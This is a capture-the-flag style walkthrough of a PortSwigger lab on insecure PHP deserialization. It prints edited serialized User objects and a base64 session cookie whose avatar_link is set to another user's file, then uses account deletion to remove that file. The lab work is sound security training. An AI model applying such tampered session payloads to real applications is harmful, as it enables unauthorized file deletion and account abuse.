
# 13 - Using application functionality to exploit insecure deserialization

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud

---------------------------------------------

References:

- https://portswigger.net/web-security/deserialization

- https://portswigger.net/web-security/deserialization/exploiting





![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/1.png)
![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/2.png)


---------------------------------------------

Generated link: https://0a1a00ed03d73b06805d1790005000f1.web-security-academy.net

After logging in, the session contains a serialized object:



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/3.png)

Decoding it as url and then as base64 we can read the serialized object:



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/4.png)

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"nkp0la3e72b8bin6215t80l8l7qkjv2v";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/5.png)

Object of class “User” has 3 parameters:
- username
- access_token
- avatar_link


Burp detects this as well:



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/6.png)

Trying to upload PHP as avatar:



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/7.png)

Trying to change the user in the session object to ricardo:

```
O:4:"User":3:{s:8:"username";s:7:"ricardo";s:12:"access_token";s:32:"ut8z43bk6jtuk09nn9ahkzax9okpyr6l";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/8.png)

We want to delete /home/carlos/morale.txt file and the avatar image is probably deleted when deleting the account, so we will change the object to:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ut8z43bk6jtuk09nn9ahkzax9okpyr6l";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Encoded:

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InV0OHo0M2JrNmp0dWswOW5uOWFoa3pheDlva3B5cjZsIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```

I change the session object in the 2 requests generated when deleting the acount:



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/9.png)



![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/10.png)